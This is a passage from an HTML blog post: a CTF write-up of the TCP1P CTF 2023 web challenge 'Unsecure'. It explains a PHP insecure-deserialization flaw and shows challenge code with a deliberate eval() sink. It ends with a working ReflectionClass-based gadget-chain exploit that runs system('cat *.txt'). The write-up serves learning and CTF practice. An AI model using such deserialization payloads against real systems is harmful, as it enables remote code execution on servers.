
<!-- ====== Blog Section Start -->
  <section class="pt-[150px] pb-[120px]">
    <div class="container">
      <div class="flex flex-wrap justify-center mx-[-16px]">
        <div class="w-full lg:w-8/12 px-4">
          <div>
            <h2 class="font-bold text-black dark:text-white text-3xl sm:text-4xl leading-tight sm:leading-tight mb-8">
              [TCP1PCTF2023] Unsecure
            </h2>
            <div
              class="flex flex-wrap items-center justify-between pb-4 mb-10 border-b border-body-color border-opacity-10 dark:border-white dark:border-opacity-10">
              <div class="flex flex-wrap items-center">
                <div class="flex items-center mr-10 mb-5">
                  <div class="max-w-[40px] w-full h-[40px] rounded-full overflow-hidden mr-4">
                    <img src="../../images/blog/author-02.png" alt="author" class="w-full" />
                  </div>
                  <div class="w-full">
                    <h4 class="text-base font-medium text-body-color mb-1">
                      By
                      <a href="javascript:void(0)" class="text-body-color hover:text-primary"> Vicevirus </a>
                    </h4>
                  </div>
                </div>
                <div class="flex items-center mb-5">
                  <p class="flex items-center text-base text-body-color font-medium mr-5">
                    <span class="mr-3">
                      <svg width="15" height="15" viewBox="0 0 15 15" class="fill-current">
                        <path
                          d="M3.89531 8.67529H3.10666C2.96327 8.67529 2.86768 8.77089 2.86768 8.91428V9.67904C2.86768 9.82243 2.96327 9.91802 3.10666 9.91802H3.89531C4.03871 9.91802 4.1343 9.82243 4.1343 9.67904V8.91428C4.1343 8.77089 4.03871 8.67529 3.89531 8.67529Z" />
                        <path
                          d="M6.429 8.67529H5.64035C5.49696 8.67529 5.40137 8.77089 5.40137 8.91428V9.67904C5.40137 9.82243 5.49696 9.91802 5.64035 9.91802H6.429C6.57239 9.91802 6.66799 9.82243 6.66799 9.67904V8.91428C6.66799 8.77089 6.5485 8.67529 6.429 8.67529Z" />
                        <path
                          d="M8.93828 8.67529H8.14963C8.00624 8.67529 7.91064 8.77089 7.91064 8.91428V9.67904C7.91064 9.82243 8.00624 9.91802 8.14963 9.91802H8.93828C9.08167 9.91802 9.17727 9.82243 9.17727 9.67904V8.91428C9.17727 8.77089 9.08167 8.67529 8.93828 8.67529Z" />
                        <path
                          d="M11.4715 8.67529H10.6828C10.5394 8.67529 10.4438 8.77089 10.4438 8.91428V9.67904C10.4438 9.82243 10.5394 9.91802 10.6828 9.91802H11.4715C11.6149 9.91802 11.7105 9.82243 11.7105 9.67904V8.91428C11.7105 8.77089 11.591 8.67529 11.4715 8.67529Z" />
                        <path
                          d="M3.89531 11.1606H3.10666C2.96327 11.1606 2.86768 11.2562 2.86768 11.3996V12.1644C2.86768 12.3078 2.96327 12.4034 3.10666 12.4034H3.89531C4.03871 12.4034 4.1343 12.3078 4.1343 12.1644V11.3996C4.1343 11.2562 4.03871 11.1606 3.89531 11.1606Z" />
                        <path
                          d="M6.429 11.1606H5.64035C5.49696 11.1606 5.40137 11.2562 5.40137 11.3996V12.1644C5.40137 12.3078 5.49696 12.4034 5.64035 12.4034H6.429C6.57239 12.4034 6.66799 12.3078 6.66799 12.1644V11.3996C6.66799 11.2562 6.5485 11.1606 6.429 11.1606Z" />
                        <path
                          d="M8.93828 11.1606H8.14963C8.00624 11.1606 7.91064 11.2562 7.91064 11.3996V12.1644C7.91064 12.3078 8.00624 12.4034 8.14963 12.4034H8.93828C9.08167 12.4034 9.17727 12.3078 9.17727 12.1644V11.3996C9.17727 11.2562 9.08167 11.1606 8.93828 11.1606Z" />
                        <path
                          d="M11.4715 11.1606H10.6828C10.5394 11.1606 10.4438 11.2562 10.4438 11.3996V12.1644C10.4438 12.3078 10.5394 12.4034 10.6828 12.4034H11.4715C11.6149 12.4034 11.7105 12.3078 11.7105 12.1644V11.3996C11.7105 11.2562 11.591 11.1606 11.4715 11.1606Z" />
                        <path
                          d="M13.2637 3.3697H7.64754V2.58105C8.19721 2.43765 8.62738 1.91189 8.62738 1.31442C8.62738 0.597464 8.02992 0 7.28906 0C6.54821 0 5.95074 0.597464 5.95074 1.31442C5.95074 1.91189 6.35702 2.41376 6.93058 2.58105V3.3697H1.31442C0.597464 3.3697 0 3.96716 0 4.68412V13.2637C0 13.9807 0.597464 14.5781 1.31442 14.5781H13.2637C13.9807 14.5781 14.5781 13.9807 14.5781 13.2637V4.68412C14.5781 3.96716 13.9807 3.3697 13.2637 3.3697ZM6.6677 1.31442C6.6677 0.979841 6.93058 0.716957 7.28906 0.716957C7.62364 0.716957 7.91042 0.979841 7.91042 1.31442C7.91042 1.649 7.64754 1.91189 7.28906 1.91189C6.95448 1.91189 6.6677 1.6251 6.6677 1.31442ZM1.31442 4.08665H13.2637C13.5983 4.08665 13.8612 4.34954 13.8612 4.68412V6.45261H0.716957V4.68412C0.716957 4.34954 0.979841 4.08665 1.31442 4.08665ZM13.2637 13.8612H1.31442C0.979841 13.8612 0.716957 13.5983 0.716957 13.2637V7.16957H13.8612V13.2637C13.8612 13.5983 13.5983 13.8612 13.2637 13.8612Z" />
                      </svg>
                    </span>
                    12 June 2024
                  </p>
                  <p class="flex items-center text-base text-body-color font-medium mr-5">
                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-link-45deg"
                      viewBox="0 0 16 16">
                      <path
                        d="M4.715 6.542 3.343 7.914a3 3 0 1 0 4.243 4.243l1.828-1.829A3 3 0 0 0 8.586 5.5L8 6.086a1 1 0 0 0-.154.199 2 2 0 0 1 .861 3.337L6.88 11.45a2 2 0 1 1-2.83-2.83l.793-.792a4 4 0 0 1-.128-1.287z" />
                      <path
                        d="M6.586 4.672A3 3 0 0 0 7.414 9.5l.775-.776a2 2 0 0 1-.896-3.346L9.12 3.55a2 2 0 1 1 2.83 2.83l-.793.792c.112.42.155.855.128 1.287l1.372-1.372a3 3 0 1 0-4.243-4.243z" />
                    </svg>&nbsp;&nbsp;
                    <span class="text-primary dark:text-white underline">  </span>
                  </p>
                </div>
              </div>
              <div class="mb-5">
                <span
                  class="bg-primary rounded-full inline-flex items-center justify-center py-2 px-4 font-semibold text-sm text-white">
                  WEB </span>
              </div>
            </div>
            <div>
              <div class="w-full rounded overflow-hidden mb-10">
                <img src="../../images/blog/blog-details-02.jpg" alt="image"
                  class="w-full h-full object-cover object-center" />
              </div>


            <p class="font-medium text-body-color text-base sm:text-lg lg:text-base xl:text-lg sm:leading-relaxed lg:leading-relaxed xl:leading-relaxed leading-relaxed mb-8">
              This challenge was solved by one of our team member
            <strong class="text-primary dark:text-white">
              H0j3n.
            </strong> I only managed to solve half of it due to time constraints and stuck on chaining the gadgets.
            </p>
            <p class="font-medium text-body-color text-base sm:text-lg lg:text-base xl:text-lg sm:leading-relaxed lg:leading-relaxed xl:leading-relaxed leading-relaxed mb-8">
              In this challenge, we were given a source code zipped in a file called <code>dist.zip</code>
            </p>
            <p class="font-medium text-body-color text-base sm:text-lg lg:text-base xl:text-lg sm:leading-relaxed lg:leading-relaxed xl:leading-relaxed leading-relaxed mb-8">

            <strong class="text-primary dark:text-white">
              Unzipped we will have the following files:
            </strong>
            </p>
            <!-- <p class="font-medium text-body-color text-base sm:text-lg lg:text-base xl:text-lg sm:leading-relaxed lg:leading-relaxed xl:leading-relaxed leading-relaxed mb-8">
              <img src="/images/ctfs/tcp1pctf2023-unsecure/Untitled.png" alt="Untitled">
            </p> -->
            <p class="font-medium text-body-color text-base sm:text-lg lg:text-base xl:text-lg sm:leading-relaxed lg:leading-relaxed xl:leading-relaxed leading-relaxed mb-8">

            <strong class="text-primary dark:text-white">
              Well, what is it? What kind of web is this?
            </strong>
            </p><hr>

            <p class="font-medium text-body-color text-base sm:text-lg lg:text-base xl:text-lg sm:leading-relaxed lg:leading-relaxed xl:leading-relaxed leading-relaxed mb-8">
              This seems like a simple PHP website with composer package manager installed. With bunch of PHP folders with the name <code>Gadgets</code>
            </p>
            <p class="font-medium text-body-color text-base sm:text-lg lg:text-base xl:text-lg sm:leading-relaxed lg:leading-relaxed xl:leading-relaxed leading-relaxed mb-8">

            <strong class="text-primary dark:text-white">
              Letâ€™s take a look at index.php first
            </strong>
            </p><hr>
<pre><code class="language-php">&lt;?php
require(&quot;vendor/autoload.php&quot;);

if (isset($_COOKIE[&#39;cookie&#39;])) {
    $cookie = base64_decode($_COOKIE[&#39;cookie&#39;]);
    unserialize($cookie);
}

echo &quot;Welcome to my web app!&quot;;
</code></pre>

            <p class="font-medium text-body-color text-base sm:text-lg lg:text-base xl:text-lg sm:leading-relaxed lg:leading-relaxed xl:leading-relaxed leading-relaxed mb-8">

            <strong class="text-primary dark:text-white">
              Breakdown of what the code does:
            </strong>
            </p>
            <ul class="list-disc list-inside text-body-color mb-10">

            <li class="font-medium text-body-color text-base sm:text-lg lg:text-base xl:text-lg mb-2">

            <strong class="text-primary dark:text-white">
              <code>require(&quot;vendor/autoload.php&quot;);</code>
            </strong>:
            <ul class="list-disc list-inside text-body-color mb-10">

            <li class="font-medium text-body-color text-base sm:text-lg lg:text-base xl:text-lg mb-2">
              This line includes the PHP file
            <strong class="text-primary dark:text-white">
              <code>vendor/autoload.php</code>
            </strong> using the
            <strong class="text-primary dark:text-white">
              <code>require</code>
            </strong> statement. This typically suggests that the code is using Composer, a PHP package manager, and it&#39;s likely loading dependencies or classes defined in the
            <strong class="text-primary dark:text-white">
              <code>vendor</code>
            </strong> directory.
            </li>
            </ul>
            </li>
            <li class="font-medium text-body-color text-base sm:text-lg lg:text-base xl:text-lg mb-2">

            <strong class="text-primary dark:text-white">
              <code>if (isset($_COOKIE[&#39;cookie&#39;]))</code>
            </strong>:
            <ul class="list-disc list-inside text-body-color mb-10">

            <li class="font-medium text-body-color text-base sm:text-lg lg:text-base xl:text-lg mb-2">
              This conditional statement checks whether a cookie named
            <strong class="text-primary dark:text-white">
              <code>&#39;cookie&#39;</code>
            </strong> is set in the user&#39;s browser.
            </li>
            </ul>
            </li>
            <li class="font-medium text-body-color text-base sm:text-lg lg:text-base xl:text-lg mb-2">
              Cookie Decoding:
            <ul class="list-disc list-inside text-body-color mb-10">

            <li class="font-medium text-body-color text-base sm:text-lg lg:text-base xl:text-lg mb-2">
              If the
            <strong class="text-primary dark:text-white">
              <code>&#39;cookie&#39;</code>
            </strong> cookie is set, the code proceeds to decode its value using
            <strong class="text-primary dark:text-white">
              <code>base64_decode</code>
            </strong>. The decoded value is stored in the
            <strong class="text-primary dark:text-white">
              <code>$cookie</code>
            </strong> variable.
            </li>
            </ul>
            </li>
            <li class="font-medium text-body-color text-base sm:text-lg lg:text-base xl:text-lg mb-2">
              Unserialization:
            <ul class="list-disc list-inside text-body-color mb-10">

            <li class="font-medium text-body-color text-base sm:text-lg lg:text-base xl:text-lg mb-2">
              The code then attempts to unserialize the value of the
            <strong class="text-primary dark:text-white">
              <code>$cookie</code>
            </strong> variable using the
            <strong class="text-primary dark:text-white">
              <code>unserialize()</code>
            </strong> function. This function is used to restore an object or data structure from its serialized (string) representation.
            </li>
            <li class="font-medium text-body-color text-base sm:text-lg lg:text-base xl:text-lg mb-2">
              When
            <strong class="text-primary dark:text-white">
              <code>unserialize()</code>
            </strong> is used with untrusted data, an attacker can craft malicious serialized data that contains PHP code. When this data is deserialized, the PHP code within it can be executed on the server, leading to remote code execution. This can allow attackers to take control of the server or perform malicious actions.
            </li>
            </ul>
            </li>
            </ul>
            <p class="font-medium text-body-color text-base sm:text-lg lg:text-base xl:text-lg sm:leading-relaxed lg:leading-relaxed xl:leading-relaxed leading-relaxed mb-8">
              Ohoo now we know that
            <strong class="text-primary dark:text-white">
              <code>unserialize()</code>
            </strong> is  vulnerable to
            <strong class="text-primary dark:text-white">
              insecure deserialization attackâ€¦
            </strong>
            </p>
            <p class="font-medium text-body-color text-base sm:text-lg lg:text-base xl:text-lg sm:leading-relaxed lg:leading-relaxed xl:leading-relaxed leading-relaxed mb-8">
              <img src="https://media3.giphy.com/media/8fen5LSZcHQ5O/giphy.gif?cid=7941fdc67dc8qcix5mk94s5f2t3s52y427rf9hh99vrxih1e&ep=v1_gifs_search&rid=giphy.gif&ct=g" alt="https://media3.giphy.com/media/8fen5LSZcHQ5O/giphy.gif?cid=7941fdc67dc8qcix5mk94s5f2t3s52y427rf9hh99vrxih1e&amp;ep=v1_gifs_search&amp;rid=giphy.gif&amp;ct=g">
            </p>
            <p class="font-medium text-body-color text-base sm:text-lg lg:text-base xl:text-lg sm:leading-relaxed lg:leading-relaxed xl:leading-relaxed leading-relaxed mb-8">
              But wait.. remember all the <code>Gadgets</code> files that weâ€™ve seen in the picture before this? It might be useful.
            </p>
            <p class="font-medium text-body-color text-base sm:text-lg lg:text-base xl:text-lg sm:leading-relaxed lg:leading-relaxed xl:leading-relaxed leading-relaxed mb-8">
              Letâ€™s take a look at them <code>(GadgetOne,GadgetTwo, GadgetThree)</code>
            </p>
            <p class="font-medium text-body-color text-base sm:text-lg lg:text-base xl:text-lg sm:leading-relaxed lg:leading-relaxed xl:leading-relaxed leading-relaxed mb-8">

            <strong class="text-primary dark:text-white">
              GadgetOne (Adders.php)
            </strong>
            </p><hr>
<pre><code class="language-php">&lt;?php

namespace GadgetOne {
    class Adders
    {
        private $x;
        function __construct($x)
        {
            $this-&gt;x = $x;
        }
        function get_x()
        {
            return $this-&gt;x;
        }
    }
}
</code></pre>

            <p class="font-medium text-body-color text-base sm:text-lg lg:text-base xl:text-lg sm:leading-relaxed lg:leading-relaxed xl:leading-relaxed leading-relaxed mb-8">
              This PHP code defines a class named
            <strong class="text-primary dark:text-white">
              <code>Adders</code>
            </strong> within the
            <strong class="text-primary dark:text-white">
              <code>GadgetOne</code>
            </strong> namespace, which has a private property
            <strong class="text-primary dark:text-white">
              <code>$x</code>
            </strong> and methods to set and retrieve its value.
            </p>
            <p class="font-medium text-body-color text-base sm:text-lg lg:text-base xl:text-lg sm:leading-relaxed lg:leading-relaxed xl:leading-relaxed leading-relaxed mb-8">

            <strong class="text-primary dark:text-white">
              GadgetTwo (Echoers.php)
            </strong>
            </p><hr>
<pre><code class="language-php">&lt;?php

namespace GadgetTwo {
    class Echoers
    {
        protected $klass;
        function __destruct()
        {
            echo $this-&gt;klass-&gt;get_x();
        }
    }
}
</code></pre>

            <p class="font-medium text-body-color text-base sm:text-lg lg:text-base xl:text-lg sm:leading-relaxed lg:leading-relaxed xl:leading-relaxed leading-relaxed mb-8">
              This PHP code defines a class
            <strong class="text-primary dark:text-white">
              <code>Echoers</code>
            </strong> within the
            <strong class="text-primary dark:text-white">
              <code>GadgetTwo</code>
            </strong> namespace, and when an instance of this class is destroyed, it attempts to echo the value returned by the
            <strong class="text-primary dark:text-white">
              <code>get_x()</code>
            </strong> method of an object stored in its protected
            <strong class="text-primary dark:text-white">
              <code>$klass</code>
            </strong> property, assuming that such an object is present.
            </p>
            <p class="font-medium text-body-color text-base sm:text-lg lg:text-base xl:text-lg sm:leading-relaxed lg:leading-relaxed xl:leading-relaxed leading-relaxed mb-8">

            <strong class="text-primary dark:text-white">
              GadgetThree (Vuln.php)
            </strong>
            </p><hr>
<pre><code class="language-php">&lt;?php

namespace GadgetThree {
    class Vuln
    {
        public $waf1;
        protected $waf2;
        private $waf3;
        public $cmd;
        function __toString()
        {
            if (!($this-&gt;waf1 === 1)) {
                die(&quot;not x&quot;);
            }
            if (!($this-&gt;waf2 === &quot;\xde\xad\xbe\xef&quot;)) {
                die(&quot;not y&quot;);
            }
            if (!($this-&gt;waf3) === false) {
                die(&quot;not z&quot;);
            }
            eval($this-&gt;cmd);
        }
    }
}
</code></pre>

            <p class="font-medium text-body-color text-base sm:text-lg lg:text-base xl:text-lg sm:leading-relaxed lg:leading-relaxed xl:leading-relaxed leading-relaxed mb-8">
              This PHP code defines a class
            <strong class="text-primary dark:text-white">
              <code>Vuln</code>
            </strong> within the
            <strong class="text-primary dark:text-white">
              <code>GadgetThree</code>
            </strong> namespace, with public, protected, and private properties, and when the
            <strong class="text-primary dark:text-white">
              <code>__toString()</code>
            </strong> method is called, it checks some conditions and executes the code provided in the
            <strong class="text-primary dark:text-white">
              <code>cmd</code>
            </strong> property if those conditions are met, potentially allowing for arbitrary code execution.
            </p>
            <p class="font-medium text-body-color text-base sm:text-lg lg:text-base xl:text-lg sm:leading-relaxed lg:leading-relaxed xl:leading-relaxed leading-relaxed mb-8">

            <strong class="text-primary dark:text-white">
              Interesting <code>eval()</code> function here (RCE probably)
            </strong> ðŸ‘€
            </p><hr>

            <h2 class="font-bold text-black dark:text-white font-xl sm:text-2xl lg:text-xl xl:text-2xl leading-tight sm:leading-tight lg:leading-tight xl:leading-tight mb-10">
              So.. what do we do now with all this stuff that we have found?
            </h2><hr>

            <p class="font-medium text-body-color text-base sm:text-lg lg:text-base xl:text-lg sm:leading-relaxed lg:leading-relaxed xl:leading-relaxed leading-relaxed mb-8">
              Well, I am guessing that we have to  <code>chain</code> all these <code>Gadgets</code> , serialize it using **<code>serialize()</code>
            <strong class="text-primary dark:text-white">
              and pass it to the
            <strong class="text-primary dark:text-white">
              <code>unserialize()</code>
            </strong> function inside the website in order to get the flag through <code>**RCE (Remote Code Execution)</code>
            </strong>
            </p>
            <p class="font-medium text-body-color text-base sm:text-lg lg:text-base xl:text-lg sm:leading-relaxed lg:leading-relaxed xl:leading-relaxed leading-relaxed mb-8">

            <strong class="text-primary dark:text-white">
              To make it simple:
            </strong>
            </p>
            <ul class="list-disc list-inside text-body-color mb-10">

            <li class="font-medium text-body-color text-base sm:text-lg lg:text-base xl:text-lg mb-2">

            <strong class="text-primary dark:text-white">
              GadgetOne(Adders.php)
            </strong> stores value.
            </li>
            <li class="font-medium text-body-color text-base sm:text-lg lg:text-base xl:text-lg mb-2">

            <strong class="text-primary dark:text-white">
              GadgetTwo(Echoers.php)
            </strong> echo the value given to it after the object is destroyed.
            </li>
            <li class="font-medium text-body-color text-base sm:text-lg lg:text-base xl:text-lg mb-2">

            <strong class="text-primary dark:text-white">
              GadgetThree(Vuln.php)
            </strong> runs code execution
            <strong class="text-primary dark:text-white">
              <code>eval()</code>
            </strong>
            </li>
            </ul>
            <p class="font-medium text-body-color text-base sm:text-lg lg:text-base xl:text-lg sm:leading-relaxed lg:leading-relaxed xl:leading-relaxed leading-relaxed mb-8">

            <strong class="text-primary dark:text-white">
              The flow of how it should be chained and how the payload can be generated:
            </strong>
            </p>
            <ul class="list-disc list-inside text-body-color mb-10">

            <li class="font-medium text-body-color text-base sm:text-lg lg:text-base xl:text-lg mb-2">
              Initialize
            <strong class="text-primary dark:text-white">
              GadgetThree(Vuln.php),
            </strong> match all the checks, pass in <code>system()</code> command to achieve RCE.
            </li>
            <li class="font-medium text-body-color text-base sm:text-lg lg:text-base xl:text-lg mb-2">
              Initialize
            <strong class="text-primary dark:text-white">
              GadgetOne(Adders.php)
            </strong> and pass the previously initialized
            <strong class="text-primary dark:text-white">
              GadgetThree
            </strong> to
            <strong class="text-primary dark:text-white">
              GadgetOne
            </strong>.
            <strong class="text-primary dark:text-white">
              GadgetOne
            </strong> will now store our
            <strong class="text-primary dark:text-white">
              GadgetThree
            </strong> object.
            </li>
            <li class="font-medium text-body-color text-base sm:text-lg lg:text-base xl:text-lg mb-2">
              The last part is to, initialize
            <strong class="text-primary dark:text-white">
              GadgetTwo(Echoers.php)
            </strong> and pass the previously initialized
            <strong class="text-primary dark:text-white">
              GadgetOne. GadgetTwo
            </strong> will now echo the things that weâ€™ve stored in
            <strong class="text-primary dark:text-white">
              GadgetOne
            </strong> just now.
            </li>
            <li class="font-medium text-body-color text-base sm:text-lg lg:text-base xl:text-lg mb-2">
              Serialize them.
            <strong class="text-primary dark:text-white">
              (GadgetTwo)
            </strong>
            </li>
            <li class="font-medium text-body-color text-base sm:text-lg lg:text-base xl:text-lg mb-2">
              Pass it to the <code>cookie</code> on the website in base64 encoded form.
            </li>
            <li class="font-medium text-body-color text-base sm:text-lg lg:text-base xl:text-lg mb-2">
              Profit ?????
            </li>
            </ul>
            <p class="font-medium text-body-color text-base sm:text-lg lg:text-base xl:text-lg sm:leading-relaxed lg:leading-relaxed xl:leading-relaxed leading-relaxed mb-8">

            <strong class="text-primary dark:text-white">

            <strong class="text-primary dark:text-white">

            <strong class="text-primary dark:text-white">

            <strong class="text-primary dark:text-white">

            <strong class="text-primary dark:text-white">

            <strong class="text-primary dark:text-white">

            <strong class="text-primary dark:text-white">

            <strong class="text-primary dark:text-white">

            <strong class="text-primary dark:text-white">

            <strong class="text-primary dark:text-white">

            <strong class="text-primary dark:text-white">
              GadgetThree(Vuln.php) â†’ GadgetOne(Adders.php) â†’ GadgetTwo(Echoers.php)
            </strong>
            </strong>
            </strong>
            </strong>
            </strong>
            </strong>
            </strong>
            </strong>
            </strong>
            </strong>
            </strong>
            </p><hr>

            <h2 class="font-bold text-black dark:text-white font-xl sm:text-2xl lg:text-xl xl:text-2xl leading-tight sm:leading-tight lg:leading-tight xl:leading-tight mb-10">
              So, how can we craft our own deserialization payload?
            </h2>
            <p class="font-medium text-body-color text-base sm:text-lg lg:text-base xl:text-lg sm:leading-relaxed lg:leading-relaxed xl:leading-relaxed leading-relaxed mb-8">
              To craft our own <code>deserialization</code>payload, we need a PHP testbed to
            <strong class="text-primary dark:text-white">
              make it work and run it first
            </strong>. In the final step, we will serialize the working code using
            <strong class="text-primary dark:text-white">
              <code>serialize()</code>
            </strong> function.
            </p>
            <h3 class="font-bold text-black dark:text-white font-xl sm:text-2xl lg:text-xl xl:text-2xl leading-tight sm:leading-tight lg:leading-tight xl:leading-tight mb-10">
              But wait..
            <strong class="text-primary dark:text-white">
              thereâ€™s a problem.
            </strong>
            </h3>
            <p class="font-medium text-body-color text-base sm:text-lg lg:text-base xl:text-lg sm:leading-relaxed lg:leading-relaxed xl:leading-relaxed leading-relaxed mb-8">
              As we can see in the <code>Gadgets</code> code previously, the code uses <code>protected</code> and <code>private</code> variables, which doesnâ€™t allow direct tampering of variables from outside. By default, this prohibits us from passing in data and match all the checks inside the <code>Gadgets</code>
            </p>
            <p class="font-medium text-body-color text-base sm:text-lg lg:text-base xl:text-lg sm:leading-relaxed lg:leading-relaxed xl:leading-relaxed leading-relaxed mb-8">
              <img src="https://media0.giphy.com/media/7bskJX6iodRno5mufQ/giphy.gif?cid=7941fdc6k8jy92ray65lzt82oa95a3pout46c8vcd3np0jpj&ep=v1_gifs_search&rid=giphy.gif&ct=g" alt="https://media0.giphy.com/media/7bskJX6iodRno5mufQ/giphy.gif?cid=7941fdc6k8jy92ray65lzt82oa95a3pout46c8vcd3np0jpj&amp;ep=v1_gifs_search&amp;rid=giphy.gif&amp;ct=g">
            </p><hr>

            <h3 class="font-bold text-black dark:text-white font-xl sm:text-2xl lg:text-xl xl:text-2xl leading-tight sm:leading-tight lg:leading-tight xl:leading-tight mb-10">
              ReflectionClass to the rescue!
            </h3>
            <p class="font-medium text-body-color text-base sm:text-lg lg:text-base xl:text-lg sm:leading-relaxed lg:leading-relaxed xl:leading-relaxed leading-relaxed mb-8">
              In PHP, the
            <strong class="text-primary dark:text-white">
              <code>ReflectionClass</code>
            </strong> class is part of the Reflection API, which allows you to inspect and manipulate information about classes and their properties, methods, and other class-related details at runtime. Specifically,
            <strong class="text-primary dark:text-white">
              <code>ReflectionClass</code>
            </strong> is used to obtain information about a particular class. (Itâ€™s useful for dirty debugging I guess)
            </p>
            <p class="font-medium text-body-color text-base sm:text-lg lg:text-base xl:text-lg sm:leading-relaxed lg:leading-relaxed xl:leading-relaxed leading-relaxed mb-8">

            <strong class="text-primary dark:text-white">

            <strong class="text-primary dark:text-white">

            <strong class="text-primary dark:text-white">

            <strong class="text-primary dark:text-white">

            <strong class="text-primary dark:text-white">

            <strong class="text-primary dark:text-white">

            <strong class="text-primary dark:text-white">

            <strong class="text-primary dark:text-white">

            <strong class="text-primary dark:text-white">

            <strong class="text-primary dark:text-white">
              Reference:
            </strong>
            </strong>
            </strong>
            </strong>
            </strong>
            </strong>
            </strong>
            </strong>
            </strong>
            </strong>
            </p>
            <p class="font-medium text-body-color text-base sm:text-lg lg:text-base xl:text-lg sm:leading-relaxed lg:leading-relaxed xl:leading-relaxed leading-relaxed mb-8">

            <a href="undefined"><span class="text-primary dark:text-white underline">undefined</span>
            </a>
            </p>
            <p class="font-medium text-body-color text-base sm:text-lg lg:text-base xl:text-lg sm:leading-relaxed lg:leading-relaxed xl:leading-relaxed leading-relaxed mb-8">
              With <code>**ReflectionClass</code>,** we could manipulate the <code>protected</code> and <code>private</code> variables during runtime to make the code work/run as it should.
            </p>
            <p class="font-medium text-body-color text-base sm:text-lg lg:text-base xl:text-lg sm:leading-relaxed lg:leading-relaxed xl:leading-relaxed leading-relaxed mb-8">
              Now, we could easily match all the checks and pass in data to the <code>Gadgets</code> that we have just now.
            </p>
            <p class="font-medium text-body-color text-base sm:text-lg lg:text-base xl:text-lg sm:leading-relaxed lg:leading-relaxed xl:leading-relaxed leading-relaxed mb-8">
              <img src="https://media1.giphy.com/media/Vuw9m5wXviFIQ/giphy.gif?cid=7941fdc6z27eahiipohy8gcgw3092x6btqk27b8yrt0mmpfs&ep=v1_gifs_search&rid=giphy.gif&ct=g" alt="Yay! // Pls dont be traumatised by this picture">
            </p>
            <p class="font-medium text-body-color text-base sm:text-lg lg:text-base xl:text-lg sm:leading-relaxed lg:leading-relaxed xl:leading-relaxed leading-relaxed mb-8">
              Yay! // Pls dont be traumatised by this picture
            </p>
            <p class="font-medium text-body-color text-base sm:text-lg lg:text-base xl:text-lg sm:leading-relaxed lg:leading-relaxed xl:leading-relaxed leading-relaxed mb-8">

            <strong class="text-primary dark:text-white">
              Author note:
            </strong> Tbh, I thought the payload generated from this
            <strong class="text-primary dark:text-white">
              <code>ReflectionClass</code>
            </strong> method would only work locally. But after reading
            <strong class="text-primary dark:text-white">
              H0j3nâ€™s
            </strong> brief writeup and understanding a â€˜little bitâ€™ about PHP deserialization, it actually works on the same environment (locally or remotely) if it were to be serialized.
            </p>
            <h1 class="font-bold text-black dark:text-white font-xl sm:text-2xl lg:text-xl xl:text-2xl leading-tight sm:leading-tight lg:leading-tight xl:leading-tight mb-10">
              Solution
            </h1><hr>

            <h2 class="font-bold text-black dark:text-white font-xl sm:text-2xl lg:text-xl xl:text-2xl leading-tight sm:leading-tight lg:leading-tight xl:leading-tight mb-10">
              Approach 1 (Credit to H0j3n)
            </h2><pre><code class="language-php">&lt;?php
require(&quot;vendor/autoload.php&quot;);

$gadgetOne = new \GadgetOne\Adders(1);
$gadgetTwo = new \GadgetTwo\Echoers();
$gadgetThree = new \GadgetThree\Vuln();

// Setup GadgeThree == Setup Vuln with RCE
// __toString() == Need to trigger this with echo (Can only be found in Echoers.php)
// get an Vuln class instance
$vuln = new \GadgetThree\Vuln();
$reflection = new \ReflectionClass($gadgetThree);
$property = $reflection-&gt;getProperty(&#39;waf1&#39;);
$property-&gt;setAccessible(true);
$property-&gt;setValue($vuln, 1);
$property = $reflection-&gt;getProperty(&#39;waf2&#39;);
$property-&gt;setAccessible(true);
$property-&gt;setValue($vuln, &quot;\xde\xad\xbe\xef&quot;);
$property = $reflection-&gt;getProperty(&#39;waf3&#39;);
$property-&gt;setAccessible(true);
$property-&gt;setValue($vuln, false);
$property = $reflection-&gt;getProperty(&#39;cmd&#39;);
$property-&gt;setAccessible(true);
$property-&gt;setValue($vuln, &quot;system(&#39;cat *.txt&#39;);&quot;);

// Setup GadgetOne == set x = Vuln()
// __construct($x) == Can easily set x = Vuln()
// get a Adders class instance
$adders = new \GadgetOne\Adders(1);
$reflection = new \ReflectionClass($gadgetOne);
$property = $reflection-&gt;getProperty(&#39;x&#39;);
$property-&gt;setAccessible(true);
$property-&gt;setValue($adders, $vuln);

// Setup GadgetTwo
// __destruct() == Trigger if exception or exit
// We can try to set klass with GadgetOne value contains our RCE payload
// get Echoers class instance
$echoers = new \GadgetTwo\Echoers();
$reflection = new \ReflectionClass($gadgetTwo);
$property = $reflection-&gt;getProperty(&#39;klass&#39;);
$property-&gt;setAccessible(true);
$property-&gt;setValue($echoers, $adders);

$serialized = serialize($echoers);

echo base64_encode($serialized);

echo &quot;\n&quot;;

?&gt;
</code></pre>

            <p class="font-medium text-body-color text-base sm:text-lg lg:text-base xl:text-lg sm:leading-relaxed lg:leading-relaxed xl:leading-relaxed leading-relaxed mb-8">

            <strong class="text-primary dark:text-white">

            <strong class="text-primary dark:text-white">

            <strong class="text-primary dark:text-white">

            <strong class="text-primary dark:text-white">

            <strong class="text-primary dark:text-white">

            <strong class="text-primary dark:text-white">

            <strong class="text-primary dark:text-white">

            <strong class="text-primary dark:text-white">

            <strong class="text-primary dark:text-white">

            <strong class="text-primary dark:text-white">

            <strong class="text-primary dark:text-white">

            <strong class="text-primary dark:text-white">

            <strong class="text-primary dark:text-white">
              Explanation from H0j3n:
            </strong>
            </strong>
            </strong>
            </strong>
            </strong>
            </strong>
            </strong>
            </strong>
            </strong>
            </strong>
            </strong>
            </strong>
            </strong>
            </p>
            <ul class="list-disc list-inside text-body-color mb-10">

            <li class="font-medium text-body-color text-base sm:text-lg lg:text-base xl:text-lg mb-2">
              <code>__construct()</code> in GadgetOne = Use this to set <code>$x</code> to <code>Vuln()</code> with RCE + bypass the <code>waf1,waf2,waf3</code>
            </li>
            <li class="font-medium text-body-color text-base sm:text-lg lg:text-base xl:text-lg mb-2">
              <code>__destruct()</code> in GadgetTwo = Inside here got echo which will be use to trigger <code>__toString()</code>. But to trigger <code>__destruct()</code>, from what I know we need to make it exit/exception which we can set the <code>$klass</code> with the object of GadgetOne itself.
            </li>
            </ul>
            <p class="font-medium text-body-color text-base sm:text-lg lg:text-base xl:text-lg sm:leading-relaxed lg:leading-relaxed xl:leading-relaxed leading-relaxed mb-8">

            <strong class="text-primary dark:text-white">
              Useful functions in <code>ReflectionClass</code> that make this method work:
            </strong>
            </p>
